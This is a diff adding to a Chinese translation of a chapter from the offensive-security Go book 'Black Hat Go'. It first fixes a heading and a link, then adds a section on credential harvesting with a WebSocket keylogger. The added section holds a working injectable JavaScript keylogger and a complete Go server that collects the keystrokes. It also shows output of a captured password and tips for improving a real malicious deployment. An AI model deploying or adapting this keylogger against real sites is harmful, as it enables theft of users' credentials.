@@ -1,4 +1,5 @@
-## 摘要
+摘要
+
 如果您知道如何从零开始写HTTP服务器，就能够为社会工程，命令和控制（C2）传输，或者你自己的工具创建api和前端以及其他的内容创建自定义逻辑。幸运的是，Go有出色的标准包——`net/http`——构建HTTP服务；这是不仅仅是有效地写简单的服务所有需要的，以及复杂的、功能齐全的web应用程序所需要的。
 
 除了标准包外，可以使用其他第三方包快速地开发和减少繁琐的程序，例如模式匹配。这些包有助于你使用路由，构建中间件，校验请求等。
@@ -491,7 +492,7 @@ func main() {
 	log.Fatal(http.ListenAndServe(":8080", r))
 }
 ```
-代码 4-8: Credential-harvesting 服务 (https://github.com/blackhat-go/bhg/ch-4/credential_harvester/ main.go/)
+代码 4-8: Credential-harvesting 服务 (https://github.com/blackhat-go/bhg/ch-4/credential_harvester/main.go/)
 
 值得注意的第一件事是导入`github.com/Sirupsen/logrus`包。这是一个日志包，用来代替Go的`log`包。该包支持更多的日志配置选型来更好地处理错误。使用该包前需要先运行`go get`获取。
 
@@ -521,5 +522,151 @@ ip_address="127.0.0.1:34040" password="p@ssw0rd1!" time="2020-02-13 21:29:37.048
 
  在下一节中，将学习这种凭证收集技术的变体。不是等待表单提交，而是创建键盘记录器来实时捕获按键。
 
- 
+ ## 使用WebSocket API记录按键
 
+ `WebSocket API (WebSockets)`是一种全双工协议，近年来越来越流行，现在很多浏览器都支持了。为web应用服务器和客户端提供了一种有效地相互通信的方式。最重要的是，服务器不需要轮询就能向客户端发送消息。
+
+`WebSockets`非常适合用于像聊天和游戏这种”实时“的应用，但同样也可以用来做恶，像在程序里注入按键记录器来捕获用户的按键。首先，假设已经确定了一个易受到跨站点脚本攻击(第三方可以在受害者的浏览器中运行任意JavaScript的缺陷)的应用程序，或者已经损坏了一个web服务器，可以修改程序的源代码。这两种情况都应该允许包含一个远程JavaScript文件。构建服务器的基础结构来处理和客户端的WebSocket连接并处理传入的按键。
+
+为了演示，我们使用JS Bin (*http://jsbin.com*)来测试负载。JS Bin是一个在线平台，开发者可以在这里测试他们的HTML和JavaScript代码。在浏览器中访问JS Bin，并在左边栏粘贴下面的HTML，完全替换掉默认代码:
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loggin</title>
+</head>
+<body>
+<script src='http://localhost:8080/k.js'></script>
+<form action='/login' method='post'> <input name='username'/>
+<input name='password'/>
+<input type="submit"/>
+  </form>
+</body>
+</html>
+```
+
+在右边栏会显示已渲染的表单。可能会注意到，已经含有了一个src属性设置为`http://localhost:8080/k.js`的script标签。这是创建WebSocket连接并将用户输入发送给服务器的JavaScript代码。
+
+服务器现在需要做两件事：处理WebSocket和提供JavaScript文件。首先，去掉JavaScript，毕竟这是关于Go的书，而不是JavaScript。（查看https://github.com/gopherjs/gopherjs/关于使用 Go 编写 JavaScript 的说明。）JavaScript的代码如下：
+
+```javascript
+(function() {
+var conn = new WebSocket("ws://{{.}}/ws"); document.onkeypress = keypress;
+function keypress(evt) {
+s = String.fromCharCode(evt.which);
+conn.send(s); }
+})();
+```
+
+JavaScript代码处理按键事件。每当键被按下，代码就通过WebSocket将按键发送到资源ws://{{.}}/ws。回想一下这个 `{{.}}` 的值是一个表示当前上下文的Go模板占位符。该资源表示一个WebSocket URL ，根据传递给模板的字符串填充服务器位置信息。我们马上就会讲到。对于这个例子，先将JavaScript保存到名为 `logger.js` 的文件中。
+
+但先等下，你看我们说过我们是用 `k.js` 服务! 前面的HTML也明确地使用 `k.js`。怎么了? 原来 `logger.js` 是Go的一个模板，不是真的JavaScript文件。使用 `k.js` 作为模式来匹配路由。当匹配成功，服务器就会渲染保存在logger.js中的模板，并提供WebSocket连接到的主机的上下文数据。通过查看服务器代码就能知道这是如何工作的，如代码4-9所示。
+
+```go
+package main
+
+import (
+	"flag"
+	"fmt"
+	"html/template"
+	"log"
+	"net/http"
+
+	"github.com/gorilla/mux"
+	"github.com/gorilla/websocket"
+)
+
+var (
+	upgrader = websocket.Upgrader{
+		CheckOrigin: func(r *http.Request) bool { return true },
+	}
+
+	listenAddr string
+	wsAddr     string
+	jsTemplate *template.Template
+)
+
+func init() {
+	flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
+	flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
+	flag.Parse()
+	var err error
+	jsTemplate, err = template.ParseFiles("logger.js")
+	if err != nil {
+		panic(err)
+	}
+}
+
+func serveWS(w http.ResponseWriter, r *http.Request) {
+	conn, err := upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		http.Error(w, "", 500)
+		return
+	}
+	defer conn.Close()
+	fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
+	for {
+		_, msg, err := conn.ReadMessage()
+		if err != nil {
+			return
+		}
+		fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
+	}
+}
+
+func serveFile(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/javascript")
+	jsTemplate.Execute(w, wsAddr)
+}
+
+func main() {
+	r := mux.NewRouter()
+	r.HandleFunc("/ws", serveWS)
+	r.HandleFunc("/k.js", serveFile)
+	log.Fatal(http.ListenAndServe(":8080", r))
+}
+```
+
+代码 4-9: 按键记录服务 (https://github.com/blackhat-go/bhg/ch-4/websocket_keylogger/main.go/)
+
+我们有很多东西要讲。首先，请注意正在使用的另一个第三方包 ，`gorilla/websocket` ，用来处理WebSocket的通信。这是一个功能齐全，强大的包，能简化开发工作，像本章前面使用过的 `gorilla/mux`路由。不要忘记先在终端执行 **go get github.com/gorilla/websocket**。
+
+然后定义服务器用到的变量。创建了`websocket.Upgrader`实例，本质上将每个源加到白名单中。这种允许所有的源是典型的糟糕的安全实践，但是对于本例而言，我们将使用它，因为这是个测试实例并运行在本地的工作站上。在实际恶意部署中使用时，可能将源限制为明确的值。
+
+在 `main()` 函数之前自动执行的 `init()` 函数中，定义了命令行参数，并尝试解析Go模板存到 *logger.js* 文件中。注意调用 `template.ParseFiles("logger.js")` 。检查返回值确保文件被正确地解析。如果一切顺利，那么已经将解析后的模板存储在名为jsTemplate的变量中。
+
+到目前，模板中还没有任何的上下文数据或执行它。不过很快就会的。首先，定义名为 `serveWS()` 的函数，用于处理WebSocket的通信。通过调用 `upgrader .Upgrade(http.ResponseWriter, *http.Request, http.Header)` 创建了一个新的 `websocket.Conn` 实例。`Upgrade()` 方法将HTTP连接升级为使用WebSocket 协议。也就是任何被该函数处理的请求都被升级为使用WebSockets。在 `for` 的无限循环中和连接交互，调用 `conn.ReadMessage()` 来读取收到的消息。如果JavaScript工作正常，这些消息应该含有捕获到的按键。将信息和远程客户端的IP输出。
+
+已经解决了创建WebSocket处理函数中最困难的部分。下一步，创建另一个名为 `serveFile()` 的处理函数。该函数检索并返回JavaScript模板中的内容，并包含上下文数据。为此，设置 `Content-Type` 头为 ` application/javascript` 。这样浏览器就知道HTTP响应体中的内容要以JavaScript处理。在该函数的第二行也是最后一行调用 `jsTemplate.Execute(w, wsAddr)` 。还记得启动服务时在 `init()` 函数中是如何解析 *logger.js* 的吗？把结果存储在 `jsTemplate` 变量中。这行代码就是处理该模板。将 `io.Writer` 类型的参数 （本例中使用的是http.ResponseWriter类型的 w）和 `interface{}` 类型的上下文数据传给该函数。`interface{}` 类型也就是可以传递任何类型的变量，无论是字符串，结构体，还是其他类型。本例中传递的是字符串类型的 `wsAddr`这个变量。如果返回到 ` init()` 函数，会看到该变量包含由命令行参数设置的WebSocket服务的地址 。总之，使用数据填充模板并将其作为HTTP响应写入。非常漂亮！
+
+已经完成了 `serveFile()` 和 `serveWS()` 处理函数。现在，只需要配置路由器来执行模式匹配，这样就可以让合适的处理函数继续执行。在 `main()` 中和之前一样，先让两个处理函数匹配 `/ws` URL，执行 `serveWS()` 函数升级WebSocket连接。第二个路由匹配 `/k.js` ，执行 `serveFile()` 函数。这就是服务将渲染好的JavaScript推送个客户端的过程。
+
+让我们启动服务。如果打开HTML文件，应该会有 `connection established` 的信息。这是日志，因为JavaScript文件被浏览器渲染且请求WebSocket连接。如果在表单元素中键入凭证，在服务中会看到下面的输出。
+
+```shell script
+$ go run main.go -listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080 Connection from 127.0.0.1:58438
+From 127.0.0.1:58438: u
+From 127.0.0.1:58438: s
+From 127.0.0.1:58438: e 
+From 127.0.0.1:58438: r 
+From 127.0.0.1:58438: 
+From 127.0.0.1:58438: p 
+From 127.0.0.1:58438: @ 
+From 127.0.0.1:58438: s 
+From 127.0.0.1:58438: s 
+From 127.0.0.1:58438: w 
+From 127.0.0.1:58438: o 
+From 127.0.0.1:58438: r 
+From 127.0.0.1:58438: d
+```
+
+成功了，能正常工作了。输出中列出了在填写登录表单时按下的每个按键。在本例中，这是一组用户凭证。如果有问题的话，检查下命令行参数中的地址是否正确。此外，如果试图从 `localhost:8080` 以外的服务中调用 `k.js`，那么需要调整下HTML文件。
+
+有几种方式可以改善代码。第一，可以把日志输出到文件中或其他持久存储中，而不是在终端输出。这样就不会在终端关闭或服务重启后丢失数据。此外，如果同时记录多个客户端的按键，输出的数据将会混淆，这可能会使拼凑特定用户的凭证变得困难。可以使用更好的方式来避免这种情况，例如，根据唯一的客户端/端口源将键击分组。
+
+凭证收集这一部分到这就完成了。我们将通过介绍多路复用HTTP命令和控制连接来结束本章。
+
+
+
+ 
